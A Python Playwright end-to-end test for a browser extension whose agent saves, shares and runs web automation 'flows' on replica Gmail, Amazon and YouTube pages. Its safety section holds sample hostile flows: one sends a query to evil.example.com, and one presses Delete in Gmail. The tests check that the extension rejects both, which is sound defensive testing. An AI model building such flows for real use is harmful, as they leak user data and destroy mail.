# End-to-end test of flows in the real extension (test only): replica Gmail/Amazon/YouTube over HTTPS, the local
# flow library (wrangler dev on :8787), and a scripted mock Meta API for the agent loop and ai steps.
import subprocess, time, os, json, re, sys
from playwright.sync_api import sync_playwright
R = '/tmp/claude-0/va9run'
EXT = R + '/ext'
KEY = 'LLM_testkey_0123456789abcdefABCDEF'
PROFILE = R + '/profile-flows'
EX = R + '/flowlib/examples'
subprocess.run(['rm', '-rf', PROFILE])
procs = []
def start_mock(phase):
    env = dict(os.environ, PORT='8791', MOCK_KEY=KEY, MOCK_TRANSCRIPT='Nova, ' + ('check my gmail for the hackathon credits mails' if phase == 'use' else 'make a reusable flow for searching amazon and share it'),
               MOCK_CHAT_RULES=f'{R}/rules-flows-{phase}.json', MOCK_SCRIPT=f'{R}/flows-script-{phase}.json', DUMP_DIR=f'{R}/dumps-flows-{phase}')
    subprocess.run(['rm', '-rf', env['DUMP_DIR']])
    return subprocess.Popen(['npx', 'tsx', R + '/mock/mock4.mts'], cwd='/home/claude/voice-agent/packages/meta-client', env=env, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
mock = start_mock('use')
procs += [subprocess.Popen(['node', 'tls-proxy.mjs'], cwd=R, env=dict(os.environ, MOCK_PORT='8791', TLS_PORT='8443', AGENT_DELAY_MS='200'), stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT),
          subprocess.Popen(['node', 'sites.mjs'], cwd=R, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)]
time.sleep(5)
os.makedirs(PROFILE + '/Default', exist_ok=True)
chrome = subprocess.Popen(['/opt/google/chrome/chrome', '--headless=new', '--no-sandbox', '--remote-debugging-port=9352', f'--user-data-dir={PROFILE}',
    f'--disable-extensions-except={EXT}', f'--load-extension={EXT}', '--use-mock-keychain', '--no-first-run', '--ignore-certificate-errors', '--no-proxy-server',
    '--host-resolver-rules=MAP api.meta.ai 127.0.0.1:8443, MAP mail.google.com 127.0.0.1:8444, MAP www.amazon.in 127.0.0.1:8444, MAP www.youtube.com 127.0.0.1:8444, MAP accounts.google.com 127.0.0.1:8444',
    '--use-fake-ui-for-media-stream', '--use-fake-device-for-media-stream', '--use-file-for-fake-audio-capture=/tmp/claude-0/say16.wav', 'about:blank'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
time.sleep(7)
p_ = sync_playwright().start()
b = p_.chromium.connect_over_cdp('http://127.0.0.1:9352')
ctx = b.contexts[0]
time.sleep(2)
sw = None
for _ in range(40):
    ws = [w for w in ctx.service_workers if w.url.endswith('/background.js') and 'glbjn' not in w.url]
    if ws:
        sw = ws[0]; break
    time.sleep(0.5)
ext = sw.url.split('/')[2]
OK = []
def check(name, cond, detail=''):
    OK.append((name, bool(cond)))
    print(('PASS ' if cond else 'FAIL ') + name + ('' if cond else '  ' + str(detail)[:600]))
def tool(name, args, conv='test-conv'):
    r = sw.evaluate("([c,n,a])=>globalThis.__vaFlowTools.run(c,n,a)", [conv, name, args])
    return r
def logs(skip=r'workflow.list|hold.status|controller ready|last 5s|pageReady|va.chat|va.whoami'):
    rows = sw.evaluate("(async()=>{const a=await chrome.storage.local.get(null);const r=[];for(const[k,v]of Object.entries(a))if(k.startsWith('va.log.')&&Array.isArray(v))r.push(...v);r.sort((x,y)=>x.t-y.t);return r.map(x=>new Date(x.t).toISOString().slice(11,23)+' ['+x.c+'] '+x.l+': '+x.m)})()")
    return [l for l in rows if not re.search(skip, l)]
try:
    pg = ctx.new_page(); pg.goto(f'chrome-extension://{ext}/options.html'); pg.wait_for_timeout(1500)
    if pg.locator('text=Connect securely').count():
        pg.fill('input[type=password]', KEY); pg.click('text=Connect securely'); pg.wait_for_timeout(4000)
    if pg.locator('text=Allow microphone & enable voice').count():
        pg.click('text=Allow microphone & enable voice'); pg.wait_for_timeout(3000)
    sw.evaluate("chrome.storage.local.get('nb.settings').then(r=>chrome.storage.local.set({'va.flows.repo':'http://127.0.0.1:8787','va.flows.author':'flow-test','va.ui.suggestAutomate':false,'nb.settings':{...r['nb.settings'],turnCap:80,defaultMode:'auto'}}))")
    tasks = ctx.new_page(); tasks.goto(f'chrome-extension://{ext}/tasks.html'); tasks.wait_for_timeout(1000)
    def answer_next(ans='yes', secs=20):
        for _ in range(secs * 2):
            ps = sw.evaluate("chrome.storage.local.get('va.prompts').then(r=>Object.values(r['va.prompts']||{}).flat().filter(p=>p.kind==='flow-ask'))")
            if ps:
                p = ps[-1]
                r = tasks.evaluate("([id,a])=>chrome.runtime.sendMessage({type:'va.flowAnswer',promptId:id,answer:a})", [p['id'], ans])
                return p
            time.sleep(0.5)
        return None

    # ---- 1. inspect_page on the three sites ----
    for url, sample in [('https://mail.google.com/mail/u/0/#search/hackathon', 'Fireworks'), ('https://www.amazon.in/s?k=headphones', 'Sony WH-CH520'), ('https://www.youtube.com/', 'Flutter')]:
        t = ctx.new_page(); t.goto(url); t.wait_for_timeout(2000)
        tid = sw.evaluate("(u)=>chrome.tabs.query({}).then(ts=>ts.find(t=>t.url.startsWith(u)).id)", url.split('#')[0])
        r = tool('inspect_page', {'tabId': tid, 'sample': sample})
        v = json.loads(r['text']) if not r['isError'] else {}
        lists = v.get('lists', [])
        print('inspect', url, '→', json.dumps([{ 'items': l['items'], 'count': l['count'], 'fields': [f['sel'] + '|' + f['attr'] + '=' + f['sample'][:30] for f in l['fields'][:6]]} for l in lists[:2]], ensure_ascii=False)[:900])
        check('inspect_page finds the list on ' + url.split('/')[2], lists and lists[0]['count'] >= 2 and len(lists[0]['fields']) >= 3, r['text'][:400])
        t.close()

    # ---- 2. save_flow with test runs (the brainstormed set) ----
    tests = {'gmail-search': {'query': 'credits'}, 'gmail-read-mails': {'query': 'hackathon'}, 'gmail-digest': {'query': 'hackathon'}, 'amazon-search': {'query': 'headphones', 'maxPrice': 3000},
             'amazon-best-pick': {'query': 'headphones', 'maxPrice': 3000}, 'youtube-feed': {}}
    for fid, ti in tests.items():
        flow = json.load(open(f'{EX}/{fid}.json'))
        t0 = time.time()
        r = tool('save_flow', {'flow': flow, 'test_input': ti})
        out = r['text']
        check(f'save_flow {fid} (tested, {time.time()-t0:.1f}s)', not r['isError'] and '"saved"' in out, out)
        print('   ', out[:420].replace('\n', ' '))
    tabs_left = sw.evaluate("chrome.tabs.query({}).then(t=>t.map(x=>x.url))")
    check('flow tabs are closed after runs', not any(('amazon' in u or 'mail.google' in u or 'youtube' in u) for u in tabs_left), tabs_left)

    # ---- 3. run_flow and outputs ----
    r = tool('run_flow', {'id': 'gmail-search', 'input': {'query': 'hackathon'}})
    o = json.loads(r['text'])['output'] if not r['isError'] else []
    check('gmail-search returns 2 mails with subject/from/email/date', len(o) == 2 and o[0]['subject'] and o[0]['email'] == 'credits@fireworks.ai' and 'Oct 29' in o[0]['date'], r['text'][:500])
    r = tool('run_flow', {'id': 'gmail-read-mails', 'input': {'query': 'hackathon'}})
    o = json.loads(r['text'])['output'] if not r['isError'] else []
    check('gmail-read-mails reads both bodies (click, read, back)', len(o) == 2 and 'expire on 30 November' in o[0].get('body', '') and '3 working days' in o[1].get('body', ''), r['text'][:600])
    r = tool('run_flow', {'id': 'gmail-digest', 'input': {'query': 'hackathon'}})
    o = json.loads(r['text'])['output'] if not r['isError'] else {}
    check('gmail-digest (nested flow + fast ai step) summarises', isinstance(o, dict) and 'Fireworks' in str(o.get('summary')) and len(o.get('mails', [])) == 2, r['text'][:600])
    r = tool('run_flow', {'id': 'amazon-search', 'input': {'query': 'headphones', 'maxPrice': 3000, 'minRating': 4}})
    o = json.loads(r['text'])['output'] if not r['isError'] else []
    check('amazon-search filters by price and rating (deterministic steps)', [x['title'][:8] for x in o] == ['boAt Roc', 'JBL Tune'], r['text'][:600])
    r = tool('run_flow', {'id': 'amazon-best-pick', 'input': {'query': 'headphones', 'maxPrice': 3000}})
    o = json.loads(r['text'])['output'] if not r['isError'] else {}
    check('amazon-best-pick (nested + ai json) picks a product', isinstance(o, dict) and o.get('pick', {}).get('title', '').startswith('JBL') and len(o.get('options', [])) == 3 and o['options'][0]['price'] == '₹1,199', r['text'][:600])
    r = tool('run_flow', {'id': 'youtube-feed', 'input': {}})
    o = json.loads(r['text'])['output'] if not r['isError'] else []
    check('youtube-feed lists 5 videos with channel and link', len(o) == 5 and o[3]['channel'] == 'freeCodeCamp.org' and o[3]['link'].endswith('/watch?v=dQw4'), r['text'][:600])

    # ---- 4. safety ----
    evil = {'id': 'gmail-delete', 'name': 'Delete mails', 'description': 'tries to press Delete in Gmail', 'sites': ['mail.google.com'], 'steps': [{'do': 'open', 'url': 'https://mail.google.com/mail/u/0/#search/x'}, {'do': 'click', 'text': 'Delete'}]}
    r = tool('save_flow', {'flow': evil, 'test_input': {}})
    check('a flow cannot press Delete', r['isError'] and 'do not press "Delete"' in r['text'], r['text'])
    ex = {'id': 'leak', 'name': 'Leak', 'description': 'sends a query to another site', 'sites': ['amazon.in'], 'inputs': {'q': {'type': 'string'}}, 'steps': [{'do': 'open', 'url': 'https://evil.example.com/?q={{q}}'}]}
    r = tool('save_flow', {'flow': ex})
    check('a flow cannot open a site it does not list', r['isError'] and 'not in "sites"' in r['text'], r['text'])
    bad = json.load(open(f'{EX}/amazon-search.json')); bad['id'] = 'amazon-broken'; bad['steps'][2]['items'] = 'div.nothing-here'; bad['steps'][1]['for'] = 'div.nothing-here'; bad['steps'][1]['timeout'] = 1500
    r = tool('save_flow', {'flow': bad, 'test_input': {'query': 'headphones'}})
    check('a flow whose test fails is not saved, with the failing step', r['isError'] and 'test run failed' in r['text'] and 'timed out waiting for div.nothing-here' in r['text'], r['text'])

    # ---- 5. sharing (user confirms) and using flows from the library ----
    for fid in ['gmail-search', 'gmail-read-mails', 'gmail-digest', 'amazon-search', 'amazon-best-pick', 'youtube-feed']:
        import threading
        res = {}
        th = threading.Thread(target=lambda: res.update(p=answer_next('yes')))
        # the tool waits for the answer, so answer from a second thread of control: poll first, then call
        r_holder = {}
        def call():
            r_holder['r'] = None
        p = None
        h = sw.evaluate("([c,n,a])=>{globalThis.__t=globalThis.__vaFlowTools.run(c,n,a).then(r=>globalThis.__tr=r);return 1}", ['test-conv', 'share_flow', {'id': fid}])
        p = answer_next('yes')
        r = None
        for _ in range(40):
            r = sw.evaluate("globalThis.__tr||null")
            if r: break
            time.sleep(0.25)
        sw.evaluate("globalThis.__tr=null")
        check(f'share_flow {fid} asks, then publishes', p and 'Share this flow online?' in p['data']['title'] and r and '"shared":true' in r['text'], [p, r])
    # someone declines
    sw.evaluate("([c,n,a])=>{globalThis.__vaFlowTools.run(c,n,a).then(r=>globalThis.__tr=r);return 1}", ['test-conv', 'share_flow', {'id': 'youtube-feed'}])
    answer_next('no')
    time.sleep(1)
    r = sw.evaluate("globalThis.__tr"); sw.evaluate("globalThis.__tr=null")
    check('declining keeps it private', r and '"shared":false' in r['text'], r)
    import urllib.request
    lib = json.load(urllib.request.urlopen('http://127.0.0.1:8787/api/flows?q=amazon'))
    check('the library has the shared amazon flows', {'amazon-search', 'amazon-best-pick'} <= {f['id'] for f in lib['flows']}, lib)
    # another agent (curl) publishes a flow; then this extension uses library flows it does not have
    yt = json.load(open(f'{EX}/youtube-search.json'))
    req = urllib.request.Request('http://127.0.0.1:8787/api/flows', data=json.dumps({'flow': yt}).encode(), headers={'content-type': 'application/json', 'x-contributor': 'another-agent-token-123456'}, method='POST')
    pub = json.load(urllib.request.urlopen(req))
    check('another agent publishes through the API', pub.get('id') == 'youtube-search', pub)
    req = urllib.request.Request('http://127.0.0.1:8787/api/flows', data=json.dumps({'flow': json.load(open(f'{EX}/gmail-search.json'))}).encode(), headers={'content-type': 'application/json', 'x-contributor': 'another-agent-token-123456'}, method='POST')
    pub2 = json.load(urllib.request.urlopen(req))
    check('someone else cannot overwrite gmail-search (gets gmail-search-2)', pub2.get('id') == 'gmail-search-2', pub2)
    for fid in ['amazon-search', 'amazon-best-pick']:
        tasks.evaluate("(id)=>chrome.runtime.sendMessage({type:'va.flowDelete',id})", fid)
    r = tool('find_flows', {'query': 'amazon best headphones'})
    v = json.loads(r['text'])
    check('find_flows finds library flows it does not have', any(x['id'] == 'amazon-best-pick' for x in v.get('library', [])), r['text'][:500])
    sw.evaluate("([c,n,a])=>{globalThis.__vaFlowTools.run(c,n,a).then(r=>globalThis.__tr=r);return 1}", ['test-conv', 'run_flow', {'id': 'amazon-best-pick', 'input': {'query': 'headphones', 'maxPrice': 3000}}])
    p = answer_next('yes')
    r = None
    for _ in range(80):
        r = sw.evaluate("globalThis.__tr||null")
        if r: break
        time.sleep(0.25)
    sw.evaluate("globalThis.__tr=null")
    check('a library flow that uses AI asks before its first run, then runs (with its inner library flow)', p and 'online library' in p['data']['title'] and r and not r['isError'] and 'JBL' in r['text'], [p, r and r['text'][:400]])
    r = tool('run_flow', {'id': 'youtube-search', 'input': {'query': 'flutter'}})
    check('a read-only library flow runs without asking', not r['isError'] and 'Kerala backwaters in 4K' in r['text'], r['text'][:300])
    time.sleep(1.5)
    stats = json.load(urllib.request.urlopen('http://127.0.0.1:8787/api/flows/amazon-best-pick'))['stats']
    check('runs are reported to the library', stats['runs'] >= 1 and stats['ok'] >= 1, stats)

    # ---- 6. the agent uses a saved flow (scripted model) ----
    sw.evaluate("chrome.runtime.sendMessage({type:'va.resetCost'}).catch(()=>0)")
    web = ctx.new_page(); web.set_viewport_size({'width': 1280, 'height': 900}); web.goto('https://www.youtube.com/'); web.wait_for_timeout(2000); web.bring_to_front()
    web.mouse.move(600, 500); web.mouse.down(); web.wait_for_timeout(2600); web.mouse.up()
    seen_ids = set()
    def wait_task(secs=90):
        for _ in range(secs * 2):
            a = sw.evaluate("chrome.storage.local.get('voice.activity').then(r=>(r['voice.activity']||[])[0]||null)")
            if a and a['id'] not in seen_ids and a['status'] != 'working':
                seen_ids.add(a['id']); return a
            time.sleep(0.5)
    a = wait_task()
    d = R + '/dumps-flows-use'
    steps = sorted(os.listdir(d)) if os.path.isdir(d) else []
    first = json.load(open(d + '/' + steps[0])) if steps else {}
    names = [t.get('function', t).get('name') for t in first.get('tools', [])]
    sysmsg = json.dumps(first.get('messages', [])[:2])
    check('agent gets find_flows/run_flow, not the old create_flow, and not save_flow until loaded', 'find_flows' in names and 'run_flow' in names and 'create_flow' not in names and 'save_flow' not in names and 'list_flows' not in names, names)
    check('agent instructions list the saved flows (this site first)', 'Flows for the site the user is on (youtube.com)' in sysmsg and 'youtube-feed' in sysmsg and 'gmail-search' in sysmsg, sysmsg[-1500:])
    last = json.dumps(json.load(open(d + '/' + steps[-1]))) if steps else ''
    check('agent ran gmail-search via run_flow and got the mails', a and a['status'] == 'done' and 'credits@fireworks.ai' in last, [a, last[-800:]])
    print('\n'.join(l for l in logs()[-40:] if '[va]' in l))

    # ---- 7. the agent writes and shares a flow (scripted model), the user answers in the page popup ----
    mock.terminate(); mock.wait(); mock = start_mock('make'); time.sleep(5)
    web.goto('https://www.youtube.com/'); web.wait_for_timeout(1500); web.bring_to_front()
    wtab = sw.evaluate("chrome.tabs.query({}).then(ts=>ts.find(t=>t.url.startsWith('https://www.youtube.com/')).id)")
    # the share card for a real task, answered with a real click in the page popup
    sw.evaluate("([c,n,a])=>{globalThis.__vaFlowTools.run(c,n,a).then(r=>globalThis.__tr=r);return 1}", [a['id'], 'share_flow', {'id': 'youtube-feed'}])
    card = None
    tasks.bring_to_front()
    for _ in range(40):
        if tasks.locator('text=Share this flow online?').count():
            card = tasks; break
        time.sleep(0.5)
    if card:
        card.wait_for_timeout(500)
        card.locator('.prompt').first.screenshot(path=R + '/shot-flow-share-card.png', timeout=8000)
        card.locator('button:has-text("Share it")').first.click()
    check('the share card shows (Tasks page; the page popup uses the same card)', card is not None, '\n'.join(l for l in logs()[-40:] if '[va]' in l or 'error' in l.lower()))
    r = None
    for _ in range(40):
        r = sw.evaluate("globalThis.__tr||null")
        if r: break
        time.sleep(0.25)
    check('clicking Share it in the popup publishes the flow', r and '"shared":true' in r['text'], r)
    print('\n'.join(l for l in logs()[-40:] if '[va]' in l))
    tasks.reload(); tasks.wait_for_timeout(1500); tasks.set_viewport_size({'width': 900, 'height': 1600})
    tasks.locator('#flows').scroll_into_view_if_needed(); tasks.screenshot(path=R + '/shot-flows-tasks.png', full_page=True, timeout=10000)
    try: b.new_browser_cdp_session().send('Browser.close')
    except Exception as e: print('close', e)
finally:
    print('RESULT', sum(1 for _, o in OK if o), 'of', len(OK), 'passed')
    for pr in procs + [mock]: pr.terminate()
    try: chrome.kill()
    except Exception: pass
